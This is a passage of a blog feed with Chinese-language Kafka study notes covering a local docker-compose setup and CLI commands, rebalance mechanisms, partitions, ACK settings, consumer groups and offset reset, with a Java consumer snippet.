      - &amp;quot;9999:9999&amp;quot;
    environment:
      KAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL
      KAFKA_ZOOKEEPER_CONNECT: &amp;quot;zoo1:2181&amp;quot;
      KAFKA_BROKER_ID: 1
      KAFKA_LOG4J_LOGGERS: &amp;quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&amp;quot;
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1
      KAFKA_JMX_PORT: 9999
      KAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}
      KAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer
      KAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &amp;quot;true&amp;quot;
    depends_on:
      - zoo1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker compose up  -d
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it kafka1 bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刪除 JMX env&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unset JMX_PORT &amp;amp;&amp;amp; unset KAFKA_JMX_OPTS
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 topic 詳情&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建一個 producer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看目前 topic 有多少 message, 顯示的是 offset 的值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events
quickstart-events:0:16

$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat
filebeat:0:0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 訂閱者，訂閱 quickstart-events&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;測試 kafka consumer group  消費機制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;顯示目前 kafka 有多少 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092
__consumer_offsets
filebeat
metricbeat
my_group2_v2
quickstart-events
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/" >
        </entry>
        <entry>
            <title>
                Kafka 冪等 Producer
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/</id>
            <content type="html">
                &lt;h1 id=&quot;冪等定義&quot; tabindex=&quot;-1&quot;&gt;冪等定義&lt;/h1&gt;
&lt;p&gt;冪等 = 同一個操作，執行一次或執行多次，結果都一樣。&lt;br /&gt;
不論你做 1 次、10 次、100 次，&lt;br /&gt;
系統的最終狀態必須一模一樣。&lt;/p&gt;
&lt;p&gt;kafka 重複 message 問題&lt;br /&gt;
若 ack 消息回傳期間網路中斷&lt;br /&gt;
Producer 就不會收到 ACK 通知，就會觸發 Retry 機制&lt;br /&gt;
造成訊息重複發送的情況&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251208002229.png&quot; alt=&quot;Pasted image 20251208002229.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/" >
        </entry>
        <entry>
            <title>
                Kafka rebalance 機制 - Eager Rebalance
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/</id>
            <content type="html">
                &lt;h1 id=&quot;eager-rebalance-rebalance&quot; tabindex=&quot;-1&quot;&gt;Eager Rebalance(此 rebalance 會造成世界停止)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;停止 consumer 訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194626.png&quot; alt=&quot;Pasted image 20251129194626.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;分配完重新開始訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194713.png&quot; alt=&quot;Pasted image 20251129194713.png&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;consumer 在 rebalance 後，不一定能再次訂閱到之前的 Partition&lt;/li&gt;
&lt;li&gt;在世界停止期間，所有 consumer 訂閱會停止&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制詳解&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;初始狀態&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129152948.png&quot; alt=&quot;Pasted image 20251129152948.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;新的 consumer 加入&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153059.png&quot; alt=&quot;Pasted image 20251129153059.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;通知 kafka cluster 的 Coordinator broker 進行 Rebalancing&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153922.png&quot; alt=&quot;Pasted image 20251129153922.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Coordinator broker 通知 consumer 斷開已連線的 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191802.png&quot; alt=&quot;Pasted image 20251129191802.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;開始 Rebalancing&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191900.png&quot; alt=&quot;Pasted image 20251129191900.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Coordinator broker 隨機選出一個 consumer 做為 Leader Consumer&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192518.png&quot; alt=&quot;Pasted image 20251129192518.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Leader Consumer 從 Coordinator broker 取得 consumer group info&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192715.png&quot; alt=&quot;Pasted image 20251129192715.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Leader Consumer&lt;/strong&gt; 的責任是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收集所有消費者的訂閱資訊 (subscription)。&lt;/li&gt;
&lt;li&gt;根據分配策略 (Range, RoundRobin, Sticky 等) 計算 &lt;strong&gt;partition → consumer 的映射&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;將分配結果提交給 Coordinator。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Coordinator&lt;/strong&gt; 再把這個分配結果下發給所有消費者，完成 rebalance。&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193028.png&quot; alt=&quot;Pasted image 20251129193028.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;完成 rebalance&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193100.png&quot; alt=&quot;Pasted image 20251129193100.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/" >
        </entry>
        <entry>
            <title>
                Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/</id>
            <content type="html">
                &lt;h1 id=&quot;背景故事&quot; tabindex=&quot;-1&quot;&gt;背景故事&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;kafka 在新版本引入Cooperative Rebalance(增量 Rebalance)機制&lt;br /&gt;
在過去版本中，只要 consumer 斷線，就會觸發 rebalance，會停止所有 consumer 的訂閱流&lt;br /&gt;
Cooperative Rebalance 就是為了解決這個問題&lt;br /&gt;
以下是具體流程&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;停止 consumer 1 對 Partition 2 的訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200033.png&quot; alt=&quot;Pasted image 20251129200033.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;過一段時間， kafka 會重新 Assign Partition 2 給 Consumer 2(new consumer)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200130.png&quot; alt=&quot;Pasted image 20251129200130.png&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]  Cooperative Rebalance 好處&lt;br /&gt;
其他 Consumer 還是可以持續訂閱，不會中斷&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;how-to-use&quot; tabindex=&quot;-1&quot;&gt;How to use?&lt;/h2&gt;
&lt;p&gt;kafka consumer 可以設定 partition.assignment.strategy&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/" >
        </entry>
        <entry>
            <title>
                Kafka leader partition 機制研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/</id>
            <content type="html">
                &lt;h1 id=&quot;leader-partition&quot; tabindex=&quot;-1&quot;&gt;leader partition 概念&lt;/h1&gt;
&lt;p&gt;每個 Topic 可以有多個 Partition&lt;br /&gt;
每個 Partition 都是一個 Partition 副本組&lt;br /&gt;
每個 Partition 副本組可以有多個 replication&lt;br /&gt;
每個 Partition 副本組會決定誰是 leader partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175715.png&quot; alt=&quot;Pasted image 20251207175715.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;topic = 多個 partition 副本組的集合&lt;br /&gt;
每個 Partition 都會有一個 Leader 與零個或多個 followers(副本)&lt;br /&gt;
kafka 分片分配規則&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在同個 topic 中，每個 partition 副本組的 leader 分片會儘量分散到每個 Broker&lt;/li&gt;
&lt;li&gt;一台 broker 可以同時擔任多個 partitions 副本組的 leader&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175340.png&quot; alt=&quot;Pasted image 20251207175340.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/" >
        </entry>
        <entry>
            <title>
                Kafka key hashing
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/</id>
            <content type="html">
                &lt;p&gt;Producer 預設的 Partition  邏輯使用 murmur2 進行邏輯分區，需要輸入 key，再根據 key 去切分此筆 message 該去哪個 partition，這帶來一個好處，只要是相同的 key，那他的分區位置就是可預測的，並且 kafka 保證分區內的 message 是有序性的，這點用於序列化資料是很重要的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!CAUTION]&lt;br /&gt;
若使用 kafka key 有序性分區，當新增 partition 時，會打破原本的分區規則&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;若因業務需求無法擴張 partition 數量，例如交易資料需要有序性，可以增加 broker 數量&lt;br /&gt;
此論點依據為&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Leader partition 會重新分散到更多 broker&lt;br /&gt;
假設：&lt;br /&gt;
- 3 partitions&lt;br /&gt;
- 3 brokers
&lt;ul&gt;
&lt;li&gt;每個 broker 當 1 個 leader&lt;br /&gt;
現在變成：
&lt;ul&gt;
&lt;li&gt;3 partitions&lt;/li&gt;
&lt;li&gt;6 brokers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leader 還是 3 個沒錯，但 follower replicas 會被分散&lt;/li&gt;
&lt;/ul&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/" >
        </entry>
        <entry>
            <title>
                Kafka consumer group 與 rebalance 機制
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/</id>
            <content type="html">
                &lt;p&gt;Topic 可以切分多個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134453.png&quot; alt=&quot;Pasted image 20251129134453.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一個 consumer 可以訂閱多個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134625.png&quot; alt=&quot;Pasted image 20251129134625.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;每個 consumer 都可以訂閱 Topic 內所有的 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135104.png&quot; alt=&quot;Pasted image 20251129135104.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;多個 Consumer 可以組成一個 Consumer group&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134529.png&quot; alt=&quot;Pasted image 20251129134529.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;同個 Consumer group 內共享 Topic 內所有的 Partition&lt;br /&gt;
一個 consumer 就會訂閱所有的 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135735.png&quot; alt=&quot;Pasted image 20251129135735.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;兩個 consumer 分散訂閱 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135906.png&quot; alt=&quot;Pasted image 20251129135906.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;三個 consumer 就會一個 consumer 訂閱一個 partition，均分所有的 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140037.png&quot; alt=&quot;Pasted image 20251129140037.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;若 consumer 數量 &amp;gt; Partition 數量，多餘的 Consumer 就會 Disable&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140258.png&quot; alt=&quot;Pasted image 20251129140258.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;ui&quot; tabindex=&quot;-1&quot;&gt;以 UI 介面為例&lt;/h2&gt;
&lt;p&gt;Consumer group: &lt;code&gt;my-java-application&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140444.png&quot; alt=&quot;Pasted image 20251129140444.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;訂閱了一個 Topic，並且擁有兩個 Member&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140641.png&quot; alt=&quot;Pasted image 20251129140641.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;並且從 Assigned partitions 可以得知，總共有三個 Partition&lt;br /&gt;
client id 為 &lt;code&gt;b52ac033-cf4b-49d2-8a13-78ea6b4e1cf1&lt;/code&gt; 的 consumer 分到 1 個 partition&lt;br /&gt;
client id 為 &lt;code&gt;5545bc61-e3fd-4f2f-a0d7-fc7d77d1ddcc&lt;/code&gt; 的 consumer 分到 2 個 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140811.png&quot; alt=&quot;Pasted image 20251129140811.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查詢 consumer group 裡面的 member 目前訂閱哪個 Topic，與每個 member 訂閱的 Partition 有哪些&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups --bootstrap-server localhost:19092 --group my-java-application --describe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141307.png&quot; alt=&quot;Pasted image 20251129141307.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;案例實作&quot; tabindex=&quot;-1&quot;&gt;案例實作&lt;/h2&gt;
&lt;p&gt;Topic: demo_java&lt;br /&gt;
Partition: 3&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-topics.sh --bootstrap-server localhost:19092 --topic demo_java --describe                           
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141715.png&quot; alt=&quot;Pasted image 20251129141715.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;case-1&quot; tabindex=&quot;-1&quot;&gt;Case 1: 只有一個訂閱者&lt;/h3&gt;
&lt;p&gt;CONSUMER-ID: consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 (訂閱三個 partition)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141509.png&quot; alt=&quot;Pasted image 20251129141509.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-2&quot; tabindex=&quot;-1&quot;&gt;Case 2: 兩個訂閱者&lt;/h2&gt;
&lt;p&gt;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75 訂閱 id: 0,1 partition&lt;br /&gt;
consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 訂閱 id: 2 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141835.png&quot; alt=&quot;Pasted image 20251129141835.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-3-partition-consumer&quot; tabindex=&quot;-1&quot;&gt;Case 3: 三個訂閱者(一個 Partition 對應一個 consumer)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142121.png&quot; alt=&quot;Pasted image 20251129142121.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-4-and-gt-partition&quot; tabindex=&quot;-1&quot;&gt;Case 4: 四個訂閱者(訂閱者數量 &amp;gt; Partition 數量)&lt;/h2&gt;
&lt;p&gt;Consumer 0 未被分配到任一個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142635.png&quot; alt=&quot;Pasted image 20251129142635.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制&lt;/h1&gt;
&lt;p&gt;每次 Rebalance 都需要 Broker 參與，但不是每台 Broker 都需要參與 Rebalance 的行為，只有 Coordinator Broker 才需要&lt;br /&gt;
透過以下指令查詢 Coordinator Broker&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups.sh --bootstrap-server localhost:19092 --group my-java-application --describe --state 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129144503.png&quot; alt=&quot;Pasted image 20251129144503.png&quot; /&gt;&lt;br /&gt;
以這次案例來說，group: my-java-application 的 Coordinator Broker 是 localhost:19092&lt;/p&gt;
&lt;p&gt;觀察每次新建 consumer 都會產出的 Log&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Request joining group due to: group is already rebalancing
Revoke previously assigned partitions demo_java-1

(Re-)joining group

Successfully joined group with generation Generation{generationId=34, memberId=&#39;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75&#39;, protocol=&#39;range&#39;}

Notifying assignor about the new Assignment(partitions=[demo_java-2])
Adding newly assigned partitions: demo_java-2
Setting offset for partition demo_java-2 to the committed offset FetchPosition{offset=959, offsetEpoch=Optional[1], currentLeader=LeaderAndEpoch{leader=Optional[localhost:19092 (id: 0 rack: null)], epoch=absent}}
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Log&lt;/th&gt;
&lt;th&gt;解釋&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Request joining group due to: group is already rebalancing&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Group 在 rebalance，consumer 需要重新加入 group。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Revoke previously assigned partitions demo_java-1&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Coordinator 通知 consumer 放棄目前持有的 partition，準備進入下一輪分配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;(Re-)joining group&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 正在重新加入 group，等待 coordinator 分配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Successfully joined group with generation...&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 正式加入 group，獲得 generationId 與 memberId。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Notifying assignor about the new Assignment(...)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer client 收到 coordinator 的分配結果，更新要訂閱的 partition&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Adding newly assigned partitions: demo_java-2&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;新一輪 rebalance 分配到了 demo_java-2。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Setting offset for partition demo_java-2 to the committed offset...&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 讀取起點設定為 partition 目前已 commit 的 offset（本例為 959）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP]&lt;br /&gt;
Generation 用於追蹤目前 Group 的狀態，避免舊的成員提交 offset，只有新成員能提交 Partition offset&lt;/p&gt;
&lt;/blockquote&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/" >
        </entry>
        <entry>
            <title>
                Kafka Topic Availability
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/</id>
            <content type="html">
                &lt;h1 id=&quot;producer-ack&quot; tabindex=&quot;-1&quot;&gt;Producer ACK 機制說明&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;ACK = 0
&lt;ul&gt;
&lt;li&gt;Case: 發送速度最快，但資料丟失風險最大&lt;/li&gt;
&lt;li&gt;只要發送成功就繼續發送下一筆&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACK = 1
&lt;ul&gt;
&lt;li&gt;Case: 剛剛好的發送速度，適合日常一般資料使用，有部分資料丟失風險&lt;/li&gt;
&lt;li&gt;Leader Partition 回傳 ACK 就算成功&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACK = all (搭配)
&lt;ul&gt;
&lt;li&gt;Case: 希望資料不要丟失，可以考慮這個設置&lt;/li&gt;
&lt;li&gt;需要 Partition 副本組內指定 min.insync.replicas 數量的 replica ACK，訊息才會 ACK
&lt;ul&gt;
&lt;li&gt;min.insync.replicas = 1 -&amp;gt; Leader ACK 就成功&lt;/li&gt;
&lt;li&gt;min.insync.replicas = 2 -&amp;gt; Leader + replica 兩個 ACK 就成功&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207231419.png&quot; alt=&quot;Pasted image 20251207231419.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/" >
        </entry>
        <entry>
            <title>
                Consumer offset reset 行為
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/</id>
            <content type="html">
                &lt;h1 id=&quot;情境&quot; tabindex=&quot;-1&quot;&gt;情境&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;consumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天&lt;/p&gt;
&lt;p&gt;也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置&lt;/p&gt;
&lt;h1 id=&quot;參數&quot; tabindex=&quot;-1&quot;&gt;參數&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;auto.offset.reset=latest: 會從 kafka topic 最末端讀取 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=earliest: 從最早的地方開始讀 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;log-consumer&quot; tabindex=&quot;-1&quot;&gt;重播 log 給 consumer&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;步驟如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;關閉該 consumer group 底下所有的 consumer&lt;/li&gt;
&lt;li&gt;使用 kafka-consumer-groups 重置你想重置的 offset 位置&lt;/li&gt;
&lt;li&gt;重啟 consumer&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;java-code&quot; tabindex=&quot;-1&quot;&gt;Java code&lt;/h1&gt;
&lt;p&gt;透過 addShutdownHook 偵測 shutdown event&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;...
// get a reference  
final Thread mainThread = Thread.currentThread();  
  
Runtime.getRuntime().addShutdownHook(new Thread(){  
    public void run(){  
        log.info(&amp;quot;Detected a shutdown event&amp;quot;);  
        consumer.wakeup();  
  
        try {  
            mainThread.join();  
        } catch (InterruptedException e) {  
            e.printStackTrace();  
        }  
    }  
});
...
try(openSearchClient; consumer){  
    boolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);  
    if (!indexExists){  
        // we need to create the index on opensearch if it doesn&#39;t exist already  
        CreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);  
        openSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);  
        log.info(&amp;quot;The wikimedia index has been created&amp;quot;);  
    } else {  
        log.info(&amp;quot;The wikimedia index already exists&amp;quot;);  
    }  
  
    while (true){  
        ConsumerRecords&amp;lt;String, String&amp;gt; records = consumer.poll(Duration.ofMillis(3000));  
  
